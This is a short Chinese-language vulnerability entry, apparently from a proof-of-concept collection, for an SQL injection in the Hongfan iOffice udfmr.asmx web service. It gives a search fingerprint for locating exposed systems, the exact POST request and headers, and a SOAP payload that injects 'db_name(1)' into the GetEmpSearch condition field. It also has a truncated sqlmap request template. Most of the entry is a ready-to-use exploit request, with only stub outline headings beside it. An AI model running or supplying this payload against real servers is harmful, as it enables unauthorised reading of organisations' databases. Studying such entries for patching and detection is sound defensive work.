# 红帆iOfficeudfmr存在SQL注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="红帆 iOffice"`
- **请求**：`POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
<condition>1=db_name(1)</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>

sqlmap
POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
Host:
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns…（脚本共 890 字，完整版见原文）
```

**其他**
- 红帆iOffice udfmr存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 红帆iOffice